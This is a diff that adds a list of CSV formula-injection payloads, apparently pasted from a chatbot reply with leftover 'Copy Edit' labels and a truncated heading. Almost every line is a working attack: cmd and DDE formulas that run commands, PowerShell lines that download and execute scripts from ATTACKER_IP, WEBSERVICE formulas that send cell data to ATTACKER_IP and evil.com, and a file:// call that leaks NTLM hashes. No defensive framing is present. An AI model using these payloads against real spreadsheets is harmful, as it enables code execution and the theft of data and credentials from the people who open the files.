@@ -1,1 +1,55 @@
 =HYPERLINK("http://malicious-site.com","Click Me")
+asic CSV Injection Payloads
+These payloads execute when a user opens the CSV file in Excel and enables formulas.
+
+1️⃣ Command Execution (Windows)
+csv
+Copy
+Edit
+=cmd|'/C calc'!A0
+📌 Executes calc.exe (Calculator) on Windows.
+
+csv
+Copy
+Edit
+=cmd|'/C powershell -ExecutionPolicy Bypass -NoProfile -Command "Start-Process notepad.exe"'!A0
+📌 Executes PowerShell to open Notepad.
+
+2️⃣ Reverse Shell via Powershell
+csv
+Copy
+Edit
+=cmd|'/C powershell IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER_IP/shell.ps1")'!A0
+📌 Downloads and executes a malicious PowerShell script.
+
+3️⃣ Exfiltrating Data via Web Request
+csv
+Copy
+Edit
+=WEBSERVICE("http://ATTACKER_IP/log.php?data="&A1)
+📌 Sends data from cell A1 to an attacker's server.
+
+csv
+Copy
+Edit
+=WEBSERVICE("http://evil.com/steal?data="&A1)
+📌 Sends stolen CSV content to evil.com.
+
+4️⃣ Stealing Windows Credentials
+csv
+Copy
+Edit
+=WEBSERVICE("file://ATTACKER_IP/share")
+📌 Forces the victim to send Windows credentials (NTLM hash) to the attacker's SMB share.
+
+5️⃣ Exploiting DDE (Dynamic Data Exchange)
+csv
+Copy
+Edit
+=DDE("cmd";"/C calc";"A1")
+📌 Executes cmd.exe to open Calculator.
+
+csv
+Copy
+Edit
+=DDE("powershell";"-ExecutionPolicy Bypass -NoProfile -Command IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/malware.ps1')";"A1")
